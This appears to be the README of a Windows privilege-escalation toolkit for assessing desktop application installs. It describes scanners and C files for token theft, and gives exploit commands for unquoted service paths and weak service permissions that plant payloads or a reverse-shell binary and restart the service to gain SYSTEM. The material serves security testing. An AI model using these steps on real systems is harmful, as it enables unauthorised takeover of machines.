# Privilege Escalation

Find local privilege escalation vectors in desktop application installations — services, permissions, scheduled tasks.

**OWASP**: TC3 — Improper Authorization  
**Severity**: CRITICAL (user → SYSTEM)

## Files

| File | Description |
|------|-------------|
| [`service_exploits.ps1`](service_exploits.ps1) | Scans for: unquoted service paths, writable service binaries, weak service DACLs, writable service directories, auto-update services, writable scheduled tasks |
| [`weak_permissions.ps1`](weak_permissions.ps1) | Scans app directory tree for: writable binaries, writable configs, writable plugin dirs, weak AppData permissions |
| [`named_pipe_impersonation.c`](named_pipe_impersonation.c) | Named pipe token theft — ImpersonateNamedPipeClient + spawn cmd as impersonated user (T1134.001) |
| [`registry_persistence.ps1`](registry_persistence.ps1) | Registry persistence scanner — checks Run keys, Winlogon, IFEO, AppInit_DLLs, startup folders (T1547.001) |
| [`token_manipulation.c`](token_manipulation.c) | Token duplication/impersonation/privilege enable — steal SYSTEM tokens from running processes (T1134) |

## Usage

```powershell
# Service-based privilege escalation
.\service_exploits.ps1 -AppName "TargetApp"
.\service_exploits.ps1  # scan all non-Windows services

# File/folder permission check
.\weak_permissions.ps1 -AppPath "C:\Program Files\TargetApp"
```

## Attack Vectors

### Unquoted Service Paths
If a service path has spaces and isn't quoted (`C:\Program Files\App\svc.exe`), Windows tries `C:\Program.exe` first.
```
# Exploit: place payload at the truncated path
copy payload.exe "C:\Program.exe"
net stop <service> & net start <service>
```

### Writable Service Binary
Replace the service executable with a reverse shell. On next service start → SYSTEM shell.

### Weak Service DACL
Reconfigure the service to run your binary:
```
sc config <service> binpath= "C:\payloads\revshell.exe"
net stop <service> & net start <service>
```

### Writable Service Directory
Place a DLL hijack payload in the service's directory → loads as SYSTEM.

### Auto-Update Service
If the update channel uses HTTP or doesn't validate signatures → MitM the update → code execution as the service account (often SYSTEM).

## For Deeper Analysis

```bash
# Sysinternals AccessChk
accesschk.exe -uwcqv "Authenticated Users" * -accepteula
accesschk.exe -wvu "C:\Program Files\TargetApp\" -accepteula
```
